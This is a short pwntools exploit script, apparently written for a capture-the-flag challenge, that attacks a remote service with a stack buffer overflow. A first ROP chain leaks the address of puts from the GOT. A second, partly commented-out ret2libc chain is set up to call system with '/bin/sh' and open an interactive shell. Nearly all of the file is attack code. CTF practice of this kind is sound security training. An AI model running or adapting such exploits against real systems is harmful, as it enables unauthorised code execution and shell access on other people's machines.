from pwn import *

payload = b"A"*40
payload += p64(0x0000000000401232) #poprdi
payload += p64(0x404018) #got
payload += p64(0x0000000000401064) #plt
#payload += p64(0x00000000004011db) #main

p = remote("challs.n00bzunit3d.xyz", 42450)

p.sendline(payload)
print(p.recvuntil(b"n00bz{f4k3_fl4g}"))

puts_leak = u64(p.recv(7) + b'\x00')
print(hex(puts_leak))

#libc_address = puts_leak - 0x80ed0
#log.success(f'LIBC base: {hex(libc_address)}')

payload2 = b"A"*40
payload2 += p64(0x000000000040101a) #ret
payload2 += p64(0x0000000000401196) #poprdi
#payload2 += p64(libc_address+0x1d8698) #binsh
#payload2 += p64(libc_address+0x50d60) #system
#payload2 += p64(0x0)

#p.sendline(payload2)

#p.interactive()
